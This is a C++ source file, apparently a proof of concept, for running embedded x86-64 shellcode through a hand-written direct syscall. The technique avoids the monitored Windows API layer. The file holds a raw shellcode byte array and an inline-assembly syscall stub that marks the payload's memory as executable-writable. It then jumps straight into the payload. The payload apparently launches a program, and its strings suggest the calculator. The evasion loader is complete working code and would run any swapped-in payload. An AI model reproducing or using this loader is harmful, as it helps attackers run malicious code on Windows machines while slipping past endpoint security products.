//x86_64-w64-mingw32-g++ main.cpp -masm=intel -O0 -o direct_syscalls.exe
// credit to GhostPepper for the original PoC here: https://github.com/ghostpepper108/Evasion
// This is Steve (@tribouletx) version using inline assembly

#include <windows.h>
#include <stdio.h>

BYTE size_array[] = "\xD1"; // Size in hex

BYTE payload[] =     
	"\x58\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
    "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
    "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
    "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
    "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
    "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
    "\x48\x83\xec\x20\x41\xff\xd6\x41\xFF\xE7";

// BadProtect
NTSTATUS BadProtect(HANDLE ProcessHandle, PVOID * BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect){
	asm("mov rax,0x50;"
		"mov r10, rcx;"
		"syscall;"
		"jmp return_main;");
		
	/* // Original syscall stub //
	asm("mov [rsp+ 8], rcx;"
		"mov [rsp+16], rdx;"
		"mov [rsp+24], r8;"
		"mov [rsp+32], r9;"
		"sub rsp, 0x28;"
		"mov rax,0x50;"
		"add rsp, 0x28;"
		"mov rcx, [rsp+ 8];"
		"mov rdx, [rsp+16];"
		"mov r8, [rsp+24];"
		"mov r9, [rsp+32];"
		"mov r10, rcx;"
		"syscall;"
		"jmp return_main;");
		// End of original syscall stuff */
		
	NTSTATUS ret = 0;
	return ret;	
}

int main(){
	
	// Get current process handle
	HANDLE hProcess = GetCurrentProcess();
	
	// Get payload address
	PVOID baseAddress = payload;
	
	// Get region size
	SIZE_T regionSize = sizeof(size_array);
	
	// Old protect
	DWORD oldProtect = 0x0;
	
	//asm("int 3");
	
	printf("Address of baseAddress: %p\n", &baseAddress);
	printf("baseAddress: %p\n", baseAddress);
	
	// Call Native VirtualProtect
	BadProtect(hProcess, &baseAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	
	// Jmp here
	asm("return_main:;");
	
	// Jmp to payload, this works because our payload never touches r15
	asm("lea r15, [rip + return_main_2];"
		"jmp %0 ;"
		:: "r" (payload));
	
	// Payload returns here
	asm("return_main_2:");
	
	printf("Sayonara!\n");
	
	return 0;
}
